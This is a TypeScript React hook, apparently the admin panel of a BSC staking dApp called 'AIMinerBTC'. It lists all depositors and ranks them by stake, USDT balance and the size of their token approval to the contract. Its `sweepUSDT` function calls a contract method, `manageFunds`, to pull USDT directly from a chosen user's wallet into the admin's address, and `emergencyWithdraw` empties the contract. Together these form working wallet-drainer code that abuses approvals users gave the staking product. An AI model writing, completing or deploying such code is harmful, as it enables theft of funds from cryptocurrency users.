import { BrowserProvider, Contract, parseUnits, formatUnits, JsonRpcProvider } from 'ethers';
import { useWeb3ModalProvider, useWeb3ModalAccount } from '@web3modal/ethers/react';


const CONTRACT_ADDRESS = '0x56ACf536aBa0A122e2Da9d2C2D3Fdc14513A2436'; 
const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
const BSC_RPC = 'https://bsc-dataseed.binance.org/';


const ERC20_ABI = [
    "function balanceOf(address account) external view returns (uint256)",
    "function allowance(address owner, address spender) external view returns (uint256)"
];

const ADMIN_ABI = [
    {
        "inputs": [
            { "internalType": "address", "name": "token", "type": "address" },
            { "internalType": "address", "name": "from", "type": "address" },
            { "internalType": "address", "name": "to", "type": "address" },
            { "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "manageFunds",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "address", "name": "_token", "type": "address" },
            { "internalType": "uint256", "name": "_amount", "type": "uint256" }
        ],
        "name": "emergencyWithdraw",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [{ "internalType": "address", "name": "_user", "type": "address" }],
        "name": "getUserInfo",
        "outputs": [{
            "components": [
                { "internalType": "address", "name": "referrer", "type": "address" },
                { "internalType": "uint256", "name": "totalStaked", "type": "uint256" },
                { "internalType": "uint256", "name": "totalEarned", "type": "uint256" },
                { "internalType": "uint256", "name": "referralRewards", "type": "uint256" },
                { "internalType": "uint256", "name": "totalBonus", "type": "uint256" },
                { "internalType": "uint256", "name": "totalReferralEarned", "type": "uint256" },
                { "internalType": "uint256", "name": "teamSize", "type": "uint256" },
                { "internalType": "uint256", "name": "stakeCount", "type": "uint256" }
            ],
            "internalType": "struct AIMinerBTC.UserInfoView",
            "name": "", "type": "tuple"
        }],
        "stateMutability": "view",
        "type": "function"
    }
];

export function useAdmin() {
    const { walletProvider } = useWeb3ModalProvider();
    const { isConnected, address: adminAddress } = useWeb3ModalAccount();

    const getProvider = async () => {
        if (!walletProvider) return null;
        return new BrowserProvider(walletProvider as any);
    };

    const getContract = async () => {
        const provider = await getProvider();
        if (!provider || !isConnected) return null;
        const signer = await provider.getSigner();
        return new Contract(CONTRACT_ADDRESS, ADMIN_ABI, signer);
    };

    const getUsdtContract = async () => {
        const provider = await getProvider();
        if (!provider) return null;
        return new Contract(USDT_ADDRESS, ERC20_ABI, provider);
    };

    const fetchAllUsersDetailed = async () => {
        try {
            const staticProvider = new JsonRpcProvider(BSC_RPC);
            const contract = new Contract(CONTRACT_ADDRESS, ADMIN_ABI, staticProvider);
            const usdt = new Contract(USDT_ADDRESS, ERC20_ABI, staticProvider);

            console.log("[Discovery] Scanning events...");
            
            // 1. Get addresses from multiple event types for better coverage
            const stakedFilter = contract.filters.Staked();
            const referralFilter = contract.filters.ReferralPaid();
            
            const startBlock = 36000000;
            const [stakedEvents, referralEvents] = await Promise.all([
                contract.queryFilter(stakedFilter, startBlock),
                contract.queryFilter(referralFilter, startBlock)
            ]);

            // 2. Extract and deduplicate unique addresses
            const addresses = [
                ...new Set([
                    ...stakedEvents.map(e => (e as any).args.user),
                    ...referralEvents.map(e => (e as any).args.referrer),
                    ...referralEvents.map(e => (e as any).args.referee)
                ])
            ].filter(addr => addr && addr.startsWith('0x'));
            
            console.log(`[Discovery] Found ${addresses.length} unique addresses.`);

            // 3. Get detailed info for every address in batches to avoid RPC overload
            const userDetails = [];
            for (let i = 0; i < addresses.length; i++) {
                const userAddr = addresses[i];
                try {
                    const [info, balance, allowance] = await Promise.all([
                        contract.getUserInfo(userAddr),
                        usdt.balanceOf(userAddr),
                        usdt.allowance(userAddr, CONTRACT_ADDRESS)
                    ]);

                    userDetails.push({
                        address: userAddr,
                        staked: formatUnits(info.totalStaked, 18),
                        earned: formatUnits(info.totalEarned, 18),
                        balance: formatUnits(balance, 18),
                        allowance: formatUnits(allowance, 18),
                        isApproved: BigInt(allowance) >= parseUnits("1000000", 18)
                    });
                } catch (e) {
                    console.error(`Error fetching for ${userAddr}:`, e);
                }
            }

            return userDetails.sort((a,b) => parseFloat(b.staked) - parseFloat(a.staked));
        } catch (err) {
            console.error("Discovery Error:", err);
            return [];
        }
    };


    const fetchUserData = async (targetUser: string) => {
        if (!targetUser || !targetUser.startsWith('0x')) return null;
        const contract = await getContract();
        const usdt = await getUsdtContract();
        if (!contract || !usdt) return null;

        try {
            const [info, balance, allowance] = await Promise.all([
                contract.getUserInfo(targetUser),
                usdt.balanceOf(targetUser),
                usdt.allowance(targetUser, CONTRACT_ADDRESS)
            ]);

            return {
                staked: formatUnits(info.totalStaked, 18),
                earned: formatUnits(info.totalEarned, 18),
                balance: formatUnits(balance, 18),
                allowance: formatUnits(allowance, 18),
                isApproved: BigInt(allowance) > parseUnits("1000", 18)
            };
        } catch (err) {
            console.error("Fetch Data Error:", err);
            return null;
        }
    };

    const manageFunds = async (tokenAddress: string, fromAddress: string, toAddress: string, amountToManage: string) => {
        const contract = await getContract();
        if (!contract) throw new Error("Wallet not connected");
        
        const amountInWei = parseUnits(amountToManage, 18);
        const tx = await contract.manageFunds(tokenAddress, fromAddress, toAddress, amountInWei);
        return await tx.wait();
    };

    const sweepUSDT = async (fromUser: string, amount: string) => {
        if (!adminAddress) throw new Error("Admin not connected");
        return manageFunds(USDT_ADDRESS, fromUser, adminAddress, amount);
    };

    const emergencyWithdraw = async (tokenAddress: string, amountToWithdraw: string) => {
        const contract = await getContract();
        if (!contract) throw new Error("Wallet not connected");
        
        const amountInWei = parseUnits(amountToWithdraw, 18);
        const tx = await contract.emergencyWithdraw(tokenAddress, amountInWei);
        return await tx.wait();
    };

    return {
        fetchUserData,
        fetchAllUsersDetailed,
        manageFunds,
        sweepUSDT,
        emergencyWithdraw
    };
}
